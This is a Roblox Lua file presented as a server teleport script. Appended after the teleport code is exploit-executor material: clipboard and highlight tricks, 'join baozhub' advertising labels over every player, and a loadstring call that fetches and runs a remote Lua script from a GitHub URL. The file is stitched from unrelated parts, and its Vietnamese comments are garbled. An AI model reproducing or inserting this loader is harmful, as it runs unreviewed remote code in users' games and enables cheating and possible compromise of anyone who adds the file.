-- Server script: ƒë·∫∑t trong ServerScriptService
local Players = game:GetService("Players")

local CORRECT_PLACE_ID = 79546208627805
local TARGET_POS = Vector3.new(-20.89, 5.00, 1.92)

local function teleportCharacter(char)
	local hrp = char:WaitForChild("HumanoidRootPart", 5)
	if hrp then
		hrp.CFrame = CFrame.new(TARGET_POS)
	end
end

local function onPlayer(player)
	-- n·∫øu character ƒë√£ t·ªìn t·∫°i ngay (test trong Play), teleport lu√¥n
	if player.Character then
		if game.PlaceId == CORRECT_PLACE_ID then
			teleportCharacter(player.Character)
		end
	end

	player.CharacterAdded:Connect(function(char)
		if game.PlaceId == CORRECT_PLACE_ID then
			teleportCharacter(char)
		end
	end)
end

Players.PlayerAdded:Connect(onPlayer)

-- (tu·ª≥ ch·ªçn) n·∫øu mu·ªën teleport nh·ªØng ng∆∞·ªùi ƒë√£ c√≥ m·∫∑t khi script kh·ªüi ch·∫°y
for _, p in ipairs(Players:GetPlayers()) do
	onPlayer(p)
end
task.wait(10)
setclipboard("by baozhub")
local p = game.Players:FindFirstChild("Bl_viethuybao")
if p and p.Character then
    Instance.new("Highlight", p.Character).FillColor = Color3.fromRGB(0, 255, 0)
end
task.wait(3)
for _,p in next,game.Players:GetPlayers() do if p.Character and p.Character:FindFirstChild("Head") then local g=Instance.new("BillboardGui",p.Character.Head)g.Size=UDim2.new(0,100,0,20)g.AlwaysOnTop=true;local t=Instance.new("TextLabel",g)t.Size=UDim2.new(1,0,1,0)t.BackgroundTransparency=1;t.Text= "join baozhub" end end
task.wait(1)
loadstring(game:HttpGet('https://raw.githubusercontent.com/caomod2077/Script/refs/heads/main/FNDayFarm.lua'))()
task.wait(0.5)
local p=game.Players.LocalPlayer local c=p.Character or p.CharacterAdded:Wait() local h=c:WaitForChild("HumanoidRootPart") local l=h.Position local s=0 game:GetService("RunService").RenderStepped:Connect(function(dt)local n=h.Position if (n-l).magnitude>0.1 then s=0 print("your executor is good üòé") else s+=dt if s>=7 then warn("pls check your executor ‚ö†Ô∏è") s=0 end end l=n end
